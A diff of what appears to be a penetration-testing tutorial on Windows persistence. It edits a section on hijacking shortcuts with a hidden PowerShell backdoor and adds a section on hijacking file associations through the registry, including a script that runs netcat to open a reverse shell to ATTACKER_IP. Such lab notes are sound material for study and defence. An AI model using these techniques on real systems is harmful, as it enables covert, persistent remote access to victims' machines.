@@ -34,15 +34,21 @@ shell and then run `calc.exe` from the original location on the shortcut's prope
     
     C:\Windows\System32\calc.exe
 
-Save it as `backdoor.ps1`, or perhaps something less conspicuous.
+| ![Powershell script](../../_static/images/Screenshot from 2022-10-09 22-07-50.png) |
+|:--:|
+| Save it as `backdoor.ps1`, or perhaps something less conspicuous |
 
 Change the shortcut to point to the script. Its icon might be automatically adjusted while doing so. Be sure to point 
 the icon back to the original executable so that no visible changes appear to the user. We also want to run the script 
 in a hidden window, for which we add the `-windowstyle hidden` option to Powershell. 
 
-Making the final target of the shortcut (in the calc properties window, don't forget the icon):
+Making the final target of the shortcut:
 
     powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+
+| ![Calculator properties](../../_static/images/Screenshot from 2022-10-09 21-46-28.png) |
+|:--:|
+| Enter target for calc shortcut in its properties window, don't forget to change the icon |
 
 Start a netcat listener to receive the reverse shell:
 
@@ -53,6 +59,30 @@ the user will get a calculator just as expected. There may be a command prompt f
 immediately on the screen. A regular user might not mind too much about that, maybe. 
 
 ## Hijacking file associations
+
+We can also hijack any file association to force the operating system to run a shell whenever the user opens a 
+specific file type.
+
+The default operating system file associations are kept inside the registry, where a key is stored for every single 
+file type under `HKLM\Software\Classes\`. Check for the `.fileextension` subkey and find which Programmatic ID 
+(ProgID) is associated with it.
+
+Then search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), which will give 
+a reference to the program in charge of handling its type of files. Most ProgID entries will have a subkey 
+under `shell\open\command` where the default command to be run for files with that extension is specified. If we 
+want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens 
+the file as usual.
+
+Powershell script, for example for notepad (`.txt` extensions):
+
+    Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
+    C:\Windows\system32\NOTEPAD.EXE $args[0]
+
+Note: we have to pass `$args[0]` to notepad, as it will contain the name of the file to be opened, as given through 
+`%1`.
+
+Change the registry key to run our backdoor script in a hidden window (Data section), create a listener for the 
+reverse shell and try to open any `.txt` file on the target machine.
 
 
 
